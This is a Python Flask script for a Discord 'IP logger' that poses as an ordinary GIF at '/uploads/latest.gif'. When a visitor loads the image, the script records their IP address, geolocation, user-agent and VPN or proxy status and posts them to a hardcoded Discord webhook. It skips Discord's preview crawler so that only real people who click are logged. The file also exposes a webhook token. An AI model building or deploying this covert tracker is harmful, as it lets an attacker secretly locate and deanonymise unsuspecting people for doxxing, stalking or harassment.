import requests
from flask import Flask, send_file, request

app = Flask("app")
webhookURL = "https://ptb.discord.com/api/webhooks/1056985799775768636/Ih_MBhdY7g10QDVBF5GYFgw1QO65NF6bGqwB9owvJYCrUZ7MujaFvWJcIDLX9Z8xTf74"


@app.route("/uploads/latest.gif")
def latest():
    ip = request.remote_addr
    data = requests.get("https://ipinfo.io/json?{}".format(ip)).json()

    city = data["city"]
    region = data["region"]
    country = data["country"]

    geolocation = "City: {0}; Region: {1}; Country: {2}".format(city, region, country)
    useragent = request.headers.get('User-Agent')
    
    if "discordapp.com" in useragent or "discord.com" in useragent:
        return

    data = requests.get("https://internetdb.shodan.io/{}".format(ip)).json()

    vpn = "❎"
    proxy = "❎"
    if "vpn" in data:
        vpn = "✅"
    if "proxy" in data:
        proxy = "✅"

    headers = {
        "username": "IP Logger",
        "content": "New IP got logged!",
        "tts": True,
        "embeds": [{
            "title": "You logged a new IP!",
            "color": "414347",
            "footer": {
                "text": "https://github.com/deadchat/discord-ip-logger"
            },
            "fields": [
                {
                    "name": "IP",
                    "value": f"```{ip}```"
                },
                {
                    "name": "Geolocation",
                    "value": f"```{geolocation}```"
                },
                {
                    "name": "User-Agent",
                    "value": f"```{request.headers.get('User-Agent')}```"
                },
                {
                    "name": "VPN/Proxy",
                    "value": f"```{vpn} VPN\n{proxy} PROXY```"
                }
            ]
        }]
    }
    requests.post(webhookURL, json=headers)

    return send_file("./uploads/discord-loading.gif", mimetype='image/gif')


app.run(host="0.0.0.0", port="6969")
